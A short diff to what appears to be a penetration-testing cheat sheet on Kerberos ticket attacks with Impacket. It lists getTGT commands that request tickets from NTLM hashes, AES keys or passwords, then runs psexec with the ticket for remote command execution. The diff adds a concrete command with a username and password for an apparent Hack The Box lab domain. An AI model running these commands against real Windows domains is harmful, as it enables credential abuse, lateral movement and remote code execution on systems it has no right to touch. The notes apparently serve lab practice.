@@ -438,11 +438,13 @@ python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
 # Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
 python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
 # Request the TGT with password
-python getTGT.py <domain_name>/<user_name>:[password]
+impacket-getTGT -dc-ip 10.10.11.60 frizz.htb/M.SchoolBus:'!suBcig@MehTed!R'
 # If not provided, password is asked
 
 # Set the TGT for impacket use
 export KRB5CCNAME=<TGT_ccache_file>
+
+edit /etc/krb5.conf
 
 # Execute remote commands with any of the following by using the TGT
 python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
